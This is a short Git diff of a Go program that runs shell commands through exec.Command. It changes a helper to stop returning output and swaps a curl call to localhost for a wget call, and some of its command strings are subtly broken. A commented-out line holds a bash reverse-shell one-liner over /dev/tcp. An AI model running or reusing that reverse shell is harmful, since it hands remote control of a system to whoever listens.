@@ -9,19 +9,20 @@ import (
 )
 
 // When you expect an output
-func executeCommands(commands string) string {
+func executeCommands(commands string) {
 	parts := strings.Fields(commands)
 
 	// structuring the command order
 	head := parts[0]
 	parts = parts[1:]
-	out, err := exec.Command(head, parts...).Output()
+	cmd := exec.Command(head, parts...)
 
+	err := cmd.Run()
 	if err != nil {
 		fmt.Println(err.Error())
 		log.Fatal("something went wrong")
 	}
-	return strings.TrimSpace(string(out))
+
 }
 
 func executeBlindCommands() {
@@ -40,7 +41,7 @@ func executeBlindCommands() {
 
 func main() {
 
-	executeCommands("curl -X GET http://127.0.0.1:8000/index.html | html2text")
+	executeCommands("wget GET http://127.0.0.1:8000/index.html")
 	//executeBlindCommands()
 
 	// err := exec.Command("bash -c", "'bash -i >& /dev/tcp/127.0.0.1/443 0>&1'").Run()
